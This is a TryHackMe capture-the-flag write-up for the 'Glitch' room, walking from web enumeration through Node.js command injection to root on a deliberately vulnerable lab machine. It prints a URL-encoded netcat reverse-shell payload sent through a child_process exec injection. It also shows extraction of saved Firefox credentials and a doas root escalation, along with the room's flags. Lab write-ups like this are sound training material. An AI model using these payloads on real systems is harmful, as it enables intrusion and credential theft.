## GLITCH - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/glitch)

**Warning! The box contains blinking images and sensitive words.**

<i>This is a simple challenge in which you need to exploit a vulnerable web application and root the machine. 
It is beginner oriented, some basic JavaScript knowledge would be helpful, but not mandatory. 
Feedback is always appreciated.

Note: It might take a few minutes for the web server to actually start.</i>

**IP: 10.10.48.183**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, BurpSuite, Wfuzz<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Gobuster fuzzing.

  ```
  nmap -sC -sV -T5 -p- 10.10.48.183

  PORT   STATE SERVICE VERSION
  80/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-title: not allowed
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.48.183/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /img                  (Status: 301) [Size: 173] [--> /img/]
  /js                   (Status: 301) [Size: 171] [--> /js/]
  /secret               (Status: 200) [Size: 724]
  /Secret               (Status: 200) [Size: 724]
  Progress: 87664 / 87665 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When you visit the web page, in source code you'll find this:

  ```
        function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
  ```
  
- Open developer tools and in console call the function `getAccess()` by simply typing it followed by enter and you'll get the access token.

  ```
  Object { token: "dGhpc19pc19ub3RfcmVhbA==" }
  ```

- Decode the string, then put decoded string in Cookie value spot and reload the page.

  ```
  echo 'dGhpc19pc19ub3RfcmVhbA==' | base64 -d
  this_is_not_real 
  ```

---

## 🌐 Web Exploitation 

- Now, you can see the new page and in it source code you can find this:

  ```
    (async function () {
    const container = document.getElementById('items');
    await fetch('/api/items')
      .then((response) => response.json())
      .then((response) => {
        response.sins.forEach((element) => {
          let el = `<div class="item sins"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
          container.insertAdjacentHTML('beforeend', el);
        });
        response.errors.forEach((element) => {
          let el = `<div class="item errors"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
          container.insertAdjacentHTML('beforeend', el);
        });
        response.deaths.forEach((element) => {
          let el = `<div class="item deaths"><div class="img-wrapper"></div><h3>${element}</h3></div>`;
          container.insertAdjacentHTML('beforeend', el);
        });
      });
  
    const buttons = document.querySelectorAll('.btn');
    const items = document.querySelectorAll('.item');
    buttons.forEach((button) => {
      button.addEventListener('click', (event) => {
        event.preventDefault();
        const filter = event.target.innerText;
        items.forEach((item) => {
          if (filter === 'all') {
            item.style.display = 'flex';
          } else {
            if (item.classList.contains(filter)) {
              item.style.display = 'flex';
            } else {
              item.style.display = 'none';
            }
          }
        });
      });
    });
  })();
  ```
  
- Perfect! We have new endpoint `/api/items` so go and visit it so you can get the list of items.

  ```
  {"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
  ```
  
- When I tried to do a POST request I got this message:

  ```
  curl -X POST http://10.10.48.183/api/items
  {"message":"there_is_a_glitch_in_the_matrix"} 
  ```

- This means that there's actually another endpoint/parameter so let's fuzz it.

  ```
  wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 http://10.10.48.183/api/items\?FUZZ\=test

  ********************************************************
  * Wfuzz 3.1.0 - The Web Fuzzer                         *
  ********************************************************
  
  Target: http://10.10.48.183/api/items?FUZZ=test
  Total requests: 3132
  
  =====================================================================
  ID           Response   Lines    Word       Chars       Payload                                             
  =====================================================================
  
  000000358:   500        10 L     64 W       1081 Ch     "cmd"                                               
  
  Total time: 16.15963
  Processed Requests: 3132
  Filtered Requests: 3131
  Requests/sec.: 193.8162
  ```

- Nice, it found `cmd` which is ideal. Let's repeat the curl request with new paramater.

  ```
  curl -X POST http://10.10.48.183/api/items\?cmd\=test

  <!DOCTYPE html>
  <html lang="en">
  <head>
  <meta charset="utf-8">
  <title>Error</title>
  </head>
  <body>
  <pre>ReferenceError: test is not defined<br> &nbsp; &nbsp;at eval spatch 5:5)<br> [SNIP!]at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
  </body>
  </html>
  ```

- We got a response! Now reverse shell time, you'll need Burp for this one. I used classic `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] [PORT] >/tmp/f` shell but in order to upload it it needs to be URL encoded.

  ```
  REQUEST:
  
  POST /api/items?cmd=require("child_process").exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+[YOUR-THM-IP]+4444+>/tmp/f") HTTP/1.1
  Host: 10.10.48.183
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Cookie: token=this_is_not_real
  Upgrade-Insecure-Requests: 1
  If-None-Match: W/"a9-0aR6bAfiK/DB+A79vs3kEEVvJNc"
  Priority: u=0, i

  RESPONSE:
  
  HTTP/1.1 200 OK
  Server: nginx/1.14.0 (Ubuntu)
  Date: Wed, 21 May 2025 21:50:32 GMT
  Content-Type: text/html; charset=utf-8
  Connection: keep-alive
  X-Powered-By: Express
  ETag: W/"27-hyVNLWK8VBc+cTKoitWKEav28lY"
  Content-Length: 39
  
  vulnerability_exploited [object Object]
  ```

- If you did it correctly, you'll have a shell on your listener.

  ```
  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.48.183] 48390
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  user
  $ id
  uid=1000(user) gid=1000(user) groups=1000(user),30(dip),46(plugdev)
  ```

---

## 🧍 User Privilege Escalation

- First flag is already there, but to get the second flag we will need to escalate 2 times.

  ```
  user@ubuntu:/home$ cd user
  user@ubuntu:~$ ls -al
  total 48
  drwxr-xr-x   8 user user  4096 Jan 27  2021 .
  drwxr-xr-x   4 root root  4096 Jan 15  2021 ..
  lrwxrwxrwx   1 root root     9 Jan 21  2021 .bash_history -> /dev/null
  -rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
  drwx------   2 user user  4096 Jan  4  2021 .cache
  drwxrwxrwx   4 user user  4096 Jan 27  2021 .firefox
  drwx------   3 user user  4096 Jan  4  2021 .gnupg
  drwxr-xr-x 270 user user 12288 Jan  4  2021 .npm
  drwxrwxr-x   5 user user  4096 May 21 21:24 .pm2
  drwx------   2 user user  4096 Jan 21  2021 .ssh
  -rw-rw-r--   1 user user    22 Jan  4  2021 user.txt
  
  user@ubuntu:~$ cat user.txt 
  THM{i_don't_know_why}
  ```
  
- Well, this `.firefox` directory is very fishy. I spent some time looking for exploits and found the way in. First, convert it to ZIP and move it to your local machine.

  ```
  user@ubuntu:~$ tar -cvf firefox.tgz .firefox
  user@ubuntu:~$ ls
  firefox.tgz  user.txt

  scp firefox.tgz [YOUR-HOST-NAME]@[YOUR-THM-IP]:/path/where/you/want/it
  ```
  
- When you visit that directory you will find a username.

  ```
  user@ubuntu:~/.firefox$ ls -al
  total 20
  drwxrwxrwx  4 user user 4096 Jan 27  2021  .
  drwxr-xr-x  8 user user 4096 May 21 21:59  ..
  drwxrwxrwx 11 user user 4096 Jan 27  2021  b5w4643p.default-release
  drwxrwxrwx  3 user user 4096 Jan 27  2021 'Crash Reports'
  -rwxrwxr-x  1 user user  259 Jan 27  2021  profiles.ini
  ```

- Now, on your local machine runs this command that will open the firefox with all bookmarks and passwords saved for this specific user.

  ```firefox --profile .firefox/b5w4643p.default-release --allow-downgrade```

- Now in that session, visit `about:logins` and get those credentials.

  ```
  Website address https://glitch.thm
  v0id
  love_the_void
  ```

- Now switch to user `v0id` and let's escalate to root.

  ```
  user@ubuntu:~/.firefox$ su v0id
  Password: 
  v0id@ubuntu:/home/user/.firefox$ whoami
  v0id
  v0id@ubuntu:/home/user/.firefox$ id
  uid=1001(v0id) gid=1001(v0id) groups=1001(v0id)
  ```

---

## 👑 Root Privilege Escalation

- Right now I did a ton of enumeration and permission enumeration is what got me to root.

  ```
  v0id@ubuntu:~$ find / -type f -perm -4000 -exec ls -ldb {} \; 2>>/dev/null
  -rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
  -rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
  -rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
  -rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
  -rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
  -rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
  -rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
  -rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine
  -rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
  -rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
  -rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
  -rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
  -rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
  -rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
  -rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
  -rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
  -rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
  -rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
  -rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
  -rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
  -rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
  -rwsr-xr-x 1 root root 37952 Jan 15  2021 /usr/local/bin/doas
  ```
  
- Well, I googled this `doas` file and found the way to escalate with it. It's a one-liner command that will execute commands as root.

  ```
  v0id@ubuntu:~$ doas -u root bash -c 'cat /root/root.txt'
  Password: 
  THM{diamonds_break_our_aching_minds}
  ```
  
- That's all folks, you can find more on `doas` exploitation [here](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/)

---

## 🏁 Flags

- **Access Token**: `this_is_not_real`
- **User Flag**: `THM{i_don't_know_why}`
- **Root Flag**: `THM{diamonds_break_our_aching_minds}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding my way around webshell.`

- What did I learn?
  `New exploitation methods.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
